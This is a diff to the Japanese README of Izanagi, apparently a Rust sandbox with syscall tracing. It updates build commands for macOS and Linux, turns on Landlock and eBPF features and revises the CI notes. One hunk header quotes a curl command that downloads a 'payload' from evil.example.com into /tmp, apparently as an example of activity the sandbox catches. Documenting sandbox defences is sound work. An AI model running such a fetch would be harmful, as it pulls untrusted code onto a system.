@@ -76,7 +76,11 @@ Izanagi は隔離環境によりホストを保護しつつ、syscall トレー�
 ### 1. ビルド
 
 ```bash
+# macOS
 cargo build --release
+
+# Linux (Landlock sandbox + eBPF tracer)
+cargo build --release --features landlock,ebpf
 ```
 
 ### 2. ネイティブサンドボックスで実行
@@ -474,11 +478,11 @@ cargo +nightly install bpf-linker
 ## ビルド
 
 ```bash
-# ホスト側
+# ホスト側 (macOS)
 cargo build --release
 
-# Linux で Landlock feature 有効化
-cargo build --release --features landlock
+# Linux (Landlock sandbox + eBPF tracer)
+cargo build --release --features landlock,ebpf
 ```
 
 ### Makefile ターゲット
@@ -580,8 +584,8 @@ $ curl -s --max-time 3 http://evil.example.com/payload -o /tmp/payload
 
 GitHub Actions で Linux (ubuntu-latest) と macOS (macos-latest) の CI を実行。
 
-- **build-and-test**: 両プラットフォームで cargo build + cargo test（Linux は `--features landlock`）
-- **clippy**: 警告をエラー扱いで lint（`--features landlock`）
+- **build-and-test**: 両プラットフォームで cargo build + cargo test（Linux は `--features landlock,ebpf`）
+- **clippy**: 警告をエラー扱いで lint（Linux は `--features landlock,ebpf`）
 - **fmt**: cargo fmt --check
 - **audit**: cargo-audit による依存クレートの脆弱性チェック
 - **build-agent**: izanagi-agent の Linux バイナリ (musl/glibc × aarch64/x86_64)
